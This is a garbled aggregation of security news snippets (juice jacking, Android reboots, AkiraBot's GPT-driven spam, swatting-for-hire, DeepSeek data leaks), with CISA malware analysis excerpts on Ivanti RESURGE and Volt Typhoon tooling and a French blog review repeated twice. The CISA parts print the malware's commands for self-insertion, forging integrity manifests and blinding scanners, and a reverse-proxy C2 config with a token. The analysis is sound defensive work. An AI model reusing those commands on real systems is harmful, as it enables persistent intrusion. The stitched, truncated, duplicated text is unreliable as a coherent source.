&lt;p&gt;An attacker would then make the chargers available in airports, shopping malls, or other public venues for use by people looking to recharge depleted batteries. While the charger was ostensibly only providing electricity to the phone, it was also secretly downloading files or running malicious code on the device behind the scenes. Starting in 2012, both Apple and Google tried to mitigate the threat by requiring users to click a confirmation button on their phones before a computer—or a computer masquerading as a charger—could access files or execute code on the phone.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/security/2025/04/ios-and-android-juice-jacking-defenses-have-been-trivial-to-bypass-for-years/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

The new feature implements auto-restart of a locked device, which will make your personal data harder to extract. It’s coming as part of a Google Play Services update, though, so there’s nothing you can do to speed along the process.&lt;/p&gt;
&lt;p&gt;Google is preparing to release a &lt;a href="https://support.google.com/product-documentation/answer/14343500"&gt;new update to Play Services&lt;/a&gt; (v25.14), which brings a raft of tweaks and improvements. First &lt;a href="https://9to5google.com/2025/04/14/android-auto-restart-security/"&gt;spotted&lt;/a&gt; by 9to5Google, the update was officially released on April 14, but as with all Play Services updates, it could take a week or more to reach all devices. When 25.14 arrives, Android devices will see a few minor improvements, including prettier settings screens, improved connection with cars and watches, and content previews when using Quick Share.&lt;/p&gt;
&lt;p&gt;Most importantly, Play Services 25.14 adds a feature that Google describes thusly: “With this feature, your device automatically restarts if locked for 3 consecutive days.”&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/gadgets/2025/04/android-phones-will-soon-reboot-themselves-after-sitting-unused-for-3-days/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The finding, documented in a &lt;a href="https://www.sentinelone.com/labs/akirabot-ai-powered-bot-bypasses-captchas-spams-websites-at-scale/"&gt;post&lt;/a&gt; published by security firm SentinelOne’s SentinelLabs, underscores the double-edged sword wielded by large language models. The same thing that makes them useful for benign tasks—the breadth of data available to them and their ability to use it to generate content at scale—can often be used in malicious activities just as easily. OpenAI revoked the spammers’ account in February.&lt;/p&gt;
&lt;h2&gt;“You are a helpful assistant”&lt;/h2&gt;
&lt;p&gt;The spam blast is the work of AkiraBot—a framework that automates the sending of messages in large quantities to promote shady search optimization services to small- and medium-size websites. AkiraBot used python-based scripts to rotate the domain names advertised in the messages. It also used OpenAI’s chat API tied to the model gpt-4o-mini to generate unique messages customized to each site it spammed, a technique that likely helped it bypass filters that look for and block identical content sent to large numbers of sites. The messages are delivered through contact forms and live chat widgets embedded into the targeted websites.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/security/2025/04/openais-gpt-helps-spammers-send-blast-of-80000-messages-that-bypassed-filters/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;Summary&lt;/h3&gt;
&lt;div class="cma-section"&gt;
&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;CISA analyzed three files obtained from a critical infrastructure’s Ivanti Connect Secure device after threat actors exploited Ivanti CVE-2025-0282 for initial access. One file—that CISA is calling RESURGE—has functionality similar to SPAWNCHIMERA in how it creates a Secure Shell (SSH) tunnel for command and control (C2). RESURGE also contains a series of commands that can modify files, manipulate integrity checks, and create a web shell that is copied to the running Ivanti boot disk.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;The second file is a variant of SPAWNSLOTH, that was contained within the RESURGE sample. The file tampers with the Ivanti device logs. The third file is a custom embedded binary that contains an open-source shell script and a subset of applets from the open-source tool BusyBox. The open-source shell script allows for ability to extract an uncompressed kernel image (vmlinux) from a compromised kernel image. BusyBox enables threat actors to perform various functions such as download and execute payloads on compromised devices.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;For information on CVE-2025-0282, see CISA Alert &lt;a href="https://www.cisa.gov/news-events/alerts/2025/03/28/cisa-releases-malware-analysis-report-resurge-malware-associated-ivanti-connect-secure" title="CISA Releases Malware Analysis Report on RESURGE Malware Associated with Ivanti Connect Secure"&gt;CISA Releases Malware Analysis Report on RESURGE Malware Associated with Ivanti Connect Secure&lt;/a&gt;.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;The file 'libdsupgrade.so' is a malicious 32-bit Linux Shared Object file that was extracted from an Ivanti Connect Secure device version 22.7.4.30859. The file contains capabilities of a rootkit, dropper, backdoor, bootkit, proxy, and tunneler. The file shares similar functionality to SPAWNCHIMERA malware however, this file contains a series of commands that modify files, manipulates integrity checks, and creates a web shell that is copied to the running Ivanti boot disk. CISA is calling this variant RESURGE.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;The similarities to SPAWNCHIMERA are as follows. RESURGE checks if the file is loaded by a program called 'web' or 'dsmdm' (Figure 1).&amp;nbsp;&lt;br /&gt;&lt;br /&gt;If the 'web' program is called, it hooks accept and strncpy. It contains an embedded private key, which is Exclusive Or (XOR) encrypted, so the Threat Actor (TA) can connect to it with their public key. This proxy does not use encryption, it uses the decoding function (Figure 2). It uses tunneling to look for an Internet Protocol (IP) and data and decodes the data received which will then be funneled through the proxy. The hooked strncpy is modified to limit the copied data to 256 bytes. This is achieved by checking the web program is running within a specified address range, the bytes are not larger than 256, and the bytes do not begin with a specific byte pattern (Figure 3). The TA connects to the tunneler, which can also communicate with the file 'me/runtime/tmp/.logsrv'. When it receives traffic it will funnel to the file, where the TA can then communicate with the system via a secure shell.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;If the 'dsmdm' program is called, it creates a thread for a secure shell via SSH to the system. It doesn't bind to a port but rather binds to a file called 'me/runtime/tmp/.logsrv' and listens for connections, giving the TA a secure socket shell to the system (Figure 4). In order for the TA to access the shell, they need to access the file. Another thread is also created to drop the file 'liblogblock.so' to the '/tmp' directory. It creates a handle to the 'proc' folder, enumerating through it looking for the 'dslogserver' process. It interacts with 'dslogserver' through shared memory to read from or write to the memory it is using. It checks whether the dslogserver is up. If not, it sleeps for 10 seconds and then checks again. This behavior continues in a loop until the server is detected, at which time it will try to load a shared object file called '/tmp/.liblogblock.so' (Figure 5).&amp;nbsp;&lt;br /&gt;&lt;br /&gt;RESURGE contains a series of commands that have been broken down and perform the following functionality:&amp;nbsp;&lt;br /&gt;&lt;br /&gt;Commands 1: Inserts itself into 'ld.so.preload', sets up a web shell for remote command execution within the 'compcheckresult.cgi' file, fakes integrity checks, and generates keys against the modified files to sign the manifest file so they appear legitimate (Figure 6).&amp;nbsp;&lt;br /&gt;&lt;br /&gt;Commands 2: Decrypts, modifies, and re-encrypts coreboot Random Access Memory (RAM) disk (Figure 7).&amp;nbsp;&lt;br /&gt;&lt;br /&gt;Commands 3: Uses system() to execute several sed commands. These commands modify the contents of two Python files ('scanner.py' and 'scanner_legacy.py') by searching for particular lines and replacing them with new one which, if successful, will result in the scanning scripts no longer keeping track of mismatches or new files (Figure 8).&amp;nbsp;&lt;br /&gt;&lt;br /&gt;---Begin Commands 1---&amp;nbsp;&lt;br /&gt;/bin/sed -i '/echo_console \"Saving package\"/i&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;-Searches for the string echo_console "Saving package" and enters the following commands before it:&amp;nbsp;&lt;br /&gt;&lt;br /&gt;cp /lib/%s /tmp/data/root/lib&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;-Copies itself to '/tmp/data/root/lib'.&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;cp /home/venv3/lib/python3.6/site-packages/scanner-0.1-py3.6.egg /tmp/data/root/home/venv3/lib/python3.6/site-packages/scanner-0.1- py3.6.egg&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;-Copies a Python package 'scanner-0.1-py3.6.egg' to /tmp/data/root/home/venv3/lib/....&amp;nbsp;&lt;br /&gt;&lt;br /&gt;echo "/lib/%s "`/home/bin/openssl dgst -sha256 /lib/%s|cut -d " "-f 2` b\" &amp;gt;&amp;gt; /tmp/data/root/home/etc/manifest/manifest&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;-Calculates a SHA-256 hash for itself using openssl dgst.

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;The file, 'liblogblock.so', is a 32-bit Linux ELF binary identified as a variant of SPAWNSLOTH malware, a log tampering utility.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;If the program name is dslogserver, it detaches the shared memory containing the "g_do_syslog_servers_exist" IPC key. Next, it obtains the handle to the symbol "_ZN5DSLog4File3addEPKci" and calls 'funchook_create'. Funchook is an open source tool that allows intercepting and modifying function calls at run time. The funchook_create calls funchook_alloc, which eventually calls mmap.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;The dissembled functions were renamed with the names in the opensource for readability. The TA had removed log messages in 'funchook_create' to make it difficult to identify the open source tool that was used.&lt;/p&gt;

&lt;p&gt;The file 'dsmain' is a 64-bit Linux ELF which contains the open source script 'extract_vmlinux.sh' and the open source tool 'BusyBox'.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;The file takes three arguments (-e, -d, -g). The -e argument is used to encrypt a file with an Advance Encryption Standard (AES) key. The -d argument is used to decrypt a file using an AES key. The -g argument is used to invoke the script 'extract_vmlinux.sh' where it is written to /tmp/extract_vmlinux.sh and is used to extract the uncompressed vmlinux from a kernel image. The TA extracts vmlinux to analyze the kernel’s code, identify vulnerabilities and potentially exploit the system.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;BusyBox is an open-source project tool from a collection of Unix utilities that are widely used by embedded devices and industrial control systems (ICS). When a TA accesses a device running BusyBox, the TA can execute a series of BusyBox commands to perform various functions such as downloading and executing malicious payloads on the compromised device. The file 'dsmain' uses specified applets from BusyBox.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;--Begin Applets Used From BusyBox--&amp;nbsp;&lt;br /&gt;bzcat&amp;nbsp;&lt;br /&gt;bzip2&amp;nbsp;&lt;br /&gt;cat&amp;nbsp;&lt;br /&gt;cpio&amp;nbsp;&lt;br /&gt;find&amp;nbsp;&lt;br /&gt;gunzip&amp;nbsp;&lt;br /&gt;gzip&amp;nbsp;&lt;br /&gt;lzop&amp;nbsp;&lt;br /&gt;sed&amp;nbsp;&lt;br /&gt;sh&amp;nbsp;&lt;br /&gt;strings&amp;nbsp;&lt;br /&gt;tail&amp;nbsp;&lt;br /&gt;tar&amp;nbsp;&lt;br /&gt;touch&amp;nbsp;&lt;br /&gt;tr&amp;nbsp;&lt;br /&gt;unlzma&amp;nbsp;&lt;br /&gt;unlzop&amp;nbsp;&lt;br /&gt;unxz&amp;nbsp;&lt;br /&gt;xxd&amp;nbsp;&lt;br /&gt;xz&amp;nbsp;&lt;br /&gt;--End Applets Used From BusyBox--&lt;/p&gt;

&lt;h3&gt;Recommendations&lt;/h3&gt;
&lt;div class="cma-section"&gt;
&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Additional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, &lt;strong&gt;"Guide to Malware Incident Prevention &amp;amp; Handling for Desktops and Laptops".&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Perhaps 18-year-old Alan Filion encountered a similar teacher during his school years in California, because once Filion learned that he truly &lt;em&gt;loved&lt;/em&gt; making fake “swatting” calls to law enforcement—well, he turned the crime into a job, using handles like “Nazgul Swattings” and “Third Reich of Kiwiswats.” Originally it was all about the “power trip,” but it soon became about “money and the power trip.”&lt;/p&gt;
&lt;p&gt;“Prices: $40-Gas leak/Fire for EMS/Fire/Gas Leak [$35 for returning customers],” Filion wrote in a 2023 advertisement that ran on various social media channels. “$50 for a major police response to the house [$40 for returning customers]; $75 for a bomb threat/mass shooting threat (they will shut down the school or public location for a day) [$60 for returning customers]. All swats will be done ASAP or present time.”&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/security/2025/02/swatting-as-a-service-meet-the-kid-who-terrorized-america-with-375-violent-hoaxes/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

Within days, the DeepSeek AI assistant app climbed to the top of the iPhone App Store’s “Free Apps” category, overtaking ChatGPT.&lt;/p&gt;
&lt;p&gt;On Thursday, mobile security company &lt;a href="https://www.nowsecure.com/blog/2025/02/06/nowsecure-uncovers-multiple-security-and-privacy-flaws-in-deepseek-ios-mobile-app/"&gt;NowSecure reported&lt;/a&gt; that the app sends sensitive data over unencrypted channels, making the data readable to anyone who can monitor the traffic. More sophisticated attackers could also tamper with the data while it’s in transit. Apple strongly encourages iPhone and iPad developers to enforce encryption of data sent over the wire using ATS (&lt;a href="https://developer.apple.com/documentation/security/preventing-insecure-network-connections"&gt;App Transport Security&lt;/a&gt;). For unknown reasons, that protection is globally disabled in the app, NowSecure said.&lt;/p&gt;
&lt;h2&gt;Basic security protections MIA&lt;/h2&gt;
&lt;p&gt;What’s more, the data is sent to servers that are controlled by ByteDance, the Chinese company that owns TikTok. While some of that data is properly encrypted using transport layer security, once it’s decrypted on the ByteDance-controlled servers, it can be cross-referenced with user data collected elsewhere to identify specific users and potentially track queries and other usage.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/security/2025/02/deepseek-ios-app-sends-data-unencrypted-to-bytedance-controlled-servers/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

Relatedly, lots of business-minded webapps use Google’s OAuth, i.e. “Sign in with Google.” It’s a low-friction feedback loop—up until the startup fails, the domain goes up for sale, and somebody forgot to close down all the Google stuff.&lt;/p&gt;
&lt;p&gt;Dylan Ayrey, of Truffle Security Co., &lt;a href="https://trufflesecurity.com/blog/millions-at-risk-due-to-google-s-oauth-flaw"&gt;suggests in a report&lt;/a&gt; that this problem is more serious than anyone, especially Google, is acknowledging. Many startups make the critical mistake of not properly closing their accounts—on both Google and other web-based apps—before letting their domains expire.&lt;/p&gt;
&lt;p&gt;Given the number of people working for tech startups (6 million), the failure rate of said startups (90 percent), their usage of Google Workspaces (50 percent, all by Ayrey’s numbers), and the speed at which startups tend to fall apart, there are a lot of Google-auth-connected domains up for sale at any time. That would not be an inherent problem, except that, as Ayrey shows, buying a domain with a still-active Google account can let you re-activate the Google accounts for former employees.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/security/2025/01/startup-necromancy-dead-google-apps-domains-can-be-compromised-by-new-owners/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;CISA received three files for analysis obtained from a critical infrastructure compromised by the People’s Republic of China (PRC) state-sponsored cyber group known as Volt Typhoon.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;The submitted files enable discovery and command-and-control (C2): (1) An open source Fast Reverse Proxy Client (FRPC) tool used to open a reverse proxy between the compromised system and a Volt Typhoon C2 server; (2) a Fast Reverse Proxy (FRP) that can be used to reveal servers situated behind a network firewall or obscured through Network Address Translation (NAT); and (3) a publicly available port scanner called ScanLine.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;For more information on Volt Typhoon see, joint Cybersecurity Advisory PRC State-Sponsored Actors Compromise, and Maintain Persistent Access to, U.S. Critical Infrastructure. For more information on PRC state-sponsored malicious cyber activity, see CISA’s China Cyber Threat Overview and Advisories, webpage.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is a cross platform full featured FRP that is written in GO language (Golang) and packed using Ultimate Packer for Executables (UPX). This utility can be used to locate servers behind a network firewall or obscured through NAT. It includes the KCP (no acronym) network protocol that allows for error-checked and anonymous delivery of data streams using the User Datagram Protocol (UDP) with packet level encryption support.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;The program contains two different multiplexer libraries that can bi-directionally stream data over a NAT’d network. It also contains a command line interface (CLI) library that can leverage command shells such as PowerShell, Windows Management Instrumentation (WMI), and Z Shell (zsh). In addition, the utility features a unique capability that detects if the utility is executed from the command line or by double-clicking.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;By default it is configured to connect to an Internet Protocol (IP) address on Transmission Control Protocol (TCP) port 1080. It must receive a specially formed packet from the C2 for the utility to deploy on the system.&lt;/p&gt;

The "FRPC" is a command-line tool written in Golang that is designed to open a reverse proxy between the compromised system and the TA's C2 server.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;When the "FRPC" is installed and executed on the compromised system, it attempts to establish a connection with the Fast Reverse Proxy Server (FRPS) using the reverse proxy method to allow the TA to control the compromised system. This "FRPC" application supports encryption, compression, and allows easy token authentication. It also supports the protocols below:&amp;nbsp;&lt;br /&gt;&lt;br /&gt;--Begin protocols--&amp;nbsp;&lt;br /&gt;Transmission Control Protocol (TCP)&amp;nbsp;&lt;br /&gt;User Datagram Protocol (UDP)&amp;nbsp;&lt;br /&gt;An alternative Hypertext Transfer Protocol (HTTP)&amp;nbsp;&lt;br /&gt;An alternative Hypertext Transfer Protocol Secure (HTTPS)&amp;nbsp;&lt;br /&gt;--End protocols--&amp;nbsp;&lt;br /&gt;&lt;br /&gt;Displayed below is the "FRPC" tool configuration that contains the network communication method, the remote "FRPS" server's public Internet Protocol (IP) address and port numbers:&amp;nbsp;&lt;br /&gt;&lt;br /&gt;--Begin configuration--&amp;nbsp;&lt;br /&gt;[common]&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;server_addr = 192.168.18.111&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;server_port = 8081&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;server_addrs = [Default IP addresses]&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;server_ports = 8443,8443,8443&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;token = 1kyRdFmuk0i25JbCJmtift1c9VA05VBS&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;protocol = tcp&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;tls_enable = true&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;disable_custom_tls_first_byte = true&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;log_level = debug&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;[plugin_socks5]&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;type = tcp&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;remote_port = 1080&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;plugin = socks5&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;use_encryption = true&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;use_compression = true&amp;nbsp;&lt;br /&gt;--End configuration--&amp;nbsp;&lt;br /&gt;&lt;br /&gt;Displayed below are the command-line usages and flags of the "FRPC" tool:&amp;nbsp;&lt;br /&gt;&lt;br /&gt;--Begin usages and flags--&amp;nbsp;&lt;br /&gt;&lt;br /&gt;Usage:&amp;nbsp;&lt;br /&gt;frpc [flags]&amp;nbsp;&lt;br /&gt;frpc [command]&amp;nbsp;&lt;br /&gt;&lt;br /&gt;Available Commands:&amp;nbsp;&lt;br /&gt;help &amp;nbsp;&amp;nbsp;&amp;nbsp;

&lt;h3&gt;Recommendations&lt;/h3&gt;
&lt;div class="cma-section"&gt;
&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Additional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, &lt;strong&gt;"Guide to Malware Incident Prevention &amp;amp; Handling for Desktops and Laptops".&lt;/strong&gt;&lt;/p&gt;

We’re proud of how much has been accomplished in just a few short years, but we’re not resting on our laurels.

Évidemment, je n’ai pas tenu tous les objectifs que j’avais annoncés, mais pour au final faire d’autres choses !&lt;/p&gt;&lt;p&gt;La première, et je me suis arrêté en cours de route avec un article Part 1, est la release de Yeti 2.0 dans son &lt;a href="https://github.com/yeti-platform/yeti/releases/tag/2.0"&gt;intégralité&lt;/a&gt; que nous avons réalisée avec @tomchop.&lt;/p&gt;&lt;p&gt;Ça nous a permis de présenter la nouvelle version à @hacklu cette &lt;a href="https://www.youtube.com/watch?v=k9GeEmGalb8"&gt;année &lt;/a&gt;et d’y faire un atelier pour présenter l’intégration qui peut en être faite avec MISP, Timeskech et d’autres outils opensource de Threat Intelligence ou de DFIR.&lt;/p&gt;&lt;p&gt;Côté enseignement, avec mon collègue Bassem Haidar, nous avons stabilisé les cours de la majeure cybersécurité et nous avons intégré de nouveaux enseignements comme la sécurité du cloud et l’IAM. Nouveauté cette année, j’ai encadré beaucoup d’étudiants dans leurs stages de fin d’études dans différentes entreprises. Ça permet de rester un pied dans la “vraie” vie.&lt;/p&gt;&lt;p&gt;Pour la première fois, nous avons encadré au laboratoire un stage pour le titre ESSI de l’ANSSI, qui a donné lieu à une publication sur la menace dans le monde satellitaire que vous pouvez retrouver &lt;a href="https://www.linkedin.com/posts/sebastien-larinier-b3b21557_rapport-de-stage-activity-7112458376642453505-efQe?utm_source=share&amp;amp;utm_medium=member_desktop"&gt;ici&lt;/a&gt;, réalisé par Arnaud Giraud avec l’aide de Patrice Auffret et &lt;a href="https://onyphe.io"&gt;d’Onyphe&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;Nous avons lancé &lt;a href="https://pandora.esiea.fr"&gt;pandora&lt;/a&gt; dans le cadre de services que nous souhaitions fournir aux journalistes et aux activistes. Ce service a pour but d’analyser des fichiers pour savoir s’ils ont malveillants ou non.&lt;/p&gt;&lt;p&gt;Pour le doctorat, On avance dans l’aspect publication académique qui est un exercice pas simple, mais de nouvelles publications sur la classification de malware et la similarité de binaire sont en cours de rédaction.&lt;/p&gt;&lt;p&gt;Dernier projet auquel je participe avec Anaïs, Betrand et Yann et je ne pensais pas que ça prendrait une ampleur pareille est M82. Le projet est devenu une &lt;a href="https://www.helloasso.com/associations/m82-project"&gt;association&lt;/a&gt; et nous avons plusieurs projets en cours de réalisations que vous pouvez trouver &lt;a href="https://github.com/m82-project/"&gt;ici&lt;/a&gt;. M82 est un groupe de reflexion multi displicinaires sur les aspects sécurité, usages, couches physiques et logiques, CTI et la lutte contre la désinformation. Si vous souhaitez nous rejoindre, n’hésitez pas à me contacter.&lt;/p&gt;&lt;p&gt;J’ai aussi eu la chance de parler du livre “Cybersécurité et malwares” à la bibliothèque de la cité des sciences et de l’Industrie avec mon poto Paul chez un autre poto Mike. La vulgarisation de ces thématiques est importante pour que chacun comprenne les enjeux de la cybersécurité.&lt;/p&gt;&lt;p&gt;Les aspects techniques doivent être expliqués simplement pour que chacun puisse se faire sa propre opinion et que cela ne reste pas un sujet d’experts.&lt;/p&gt;&lt;p&gt;Sur les publications de CTI, j’ai avancé sur pas mal de choses, mais je n’ai pas trouvé d’intérêt à publier sur le sujet.

Évidemment, je n’ai pas tenu tous les objectifs que j’avais annoncés, mais pour au final faire d’autres choses !&lt;/p&gt;&lt;p&gt;La première, et je me suis arrêté en cours de route avec un article Part 1, est la release de Yeti 2.0 dans son &lt;a href="https://github.com/yeti-platform/yeti/releases/tag/2.0"&gt;intégralité&lt;/a&gt; que nous avons réalisée avec @tomchop.&lt;/p&gt;&lt;p&gt;Ça nous a permis de présenter la nouvelle version à @hacklu cette &lt;a href="https://www.youtube.com/watch?v=k9GeEmGalb8"&gt;année &lt;/a&gt;et d’y faire un atelier pour présenter l’intégration qui peut en être faite avec MISP, Timeskech et d’autres outils opensource de Threat Intelligence ou de DFIR.&lt;/p&gt;&lt;p&gt;Côté enseignement, avec mon collègue Bassem Haidar, nous avons stabilisé les cours de la majeure cybersécurité et nous avons intégré de nouveaux enseignements comme la sécurité du cloud et l’IAM. Nouveauté cette année, j’ai encadré beaucoup d’étudiants dans leurs stages de fin d’études dans différentes entreprises. Ça permet de rester un pied dans la “vraie” vie.&lt;/p&gt;&lt;p&gt;Pour la première fois, nous avons encadré au laboratoire un stage pour le titre ESSI de l’ANSSI, qui a donné lieu à une publication sur la menace dans le monde satellitaire que vous pouvez retrouver &lt;a href="https://www.linkedin.com/posts/sebastien-larinier-b3b21557_rapport-de-stage-activity-7112458376642453505-efQe?utm_source=share&amp;amp;utm_medium=member_desktop"&gt;ici&lt;/a&gt;, réalisé par Arnaud Giraud avec l’aide de Patrice Auffret et &lt;a href="https://onyphe.io"&gt;d’Onyphe&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;Nous avons lancé &lt;a href="https://pandora.esiea.fr"&gt;pandora&lt;/a&gt; dans le cadre de services que nous souhaitions fournir aux journalistes et aux activistes. Ce service a pour but d’analyser des fichiers pour savoir s’ils ont malveillants ou non.&lt;/p&gt;&lt;p&gt;Pour le doctorat, On avance dans l’aspect publication académique qui est un exercice pas simple, mais de nouvelles publications sur la classification de malware et la similarité de binaire sont en cours de rédaction.&lt;/p&gt;&lt;p&gt;Dernier projet auquel je participe avec Anaïs, Betrand et Yann et je ne pensais pas que ça prendrait une ampleur pareille est M82. Le projet est devenu une &lt;a href="https://www.helloasso.com/associations/m82-project"&gt;association&lt;/a&gt; et nous avons plusieurs projets en cours de réalisations que vous pouvez trouver &lt;a href="https://github.com/m82-project/"&gt;ici&lt;/a&gt;. M82 est un groupe de reflexion multi displicinaires sur les aspects sécurité, usages, couches physiques et logiques, CTI et la lutte contre la désinformation. Si vous souhaitez nous rejoindre, n’hésitez pas à me contacter.&lt;/p&gt;&lt;p&gt;J’ai aussi eu la chance de parler du livre “Cybersécurité et malwares” à la bibliothèque de la cité des sciences et de l’Industrie avec mon poto Paul chez un autre poto Mike. La vulgarisation de ces thématiques est importante pour que chacun comprenne les enjeux de la cybersécurité.&lt;/p&gt;&lt;p&gt;Les aspects techniques doivent être expliqués simplement pour que chacun puisse se faire sa propre opinion et que cela ne reste pas un sujet d’experts.&lt;/p&gt;&lt;p&gt;Sur les publications de CTI, j’ai avancé sur pas mal de choses, mais je n’ai pas trouvé d’intérêt à publier sur le sujet. J’essaierai de le faire en 2024 dans le cadre de M82&lt;/p&gt;&lt;p&gt;La &lt;a href="https://www.botconf.eu/"&gt;botconf &lt;/a&gt;a fêté sa 10 eme année et encore une fois et nous continuons nos efforts pour garantir la qualité de la conférence ce qui lui a permis de devenir incontournable sur les sujets concernant les malwares, les botnets et la CTI.

&lt;h5&gt;Description&lt;/h5&gt;
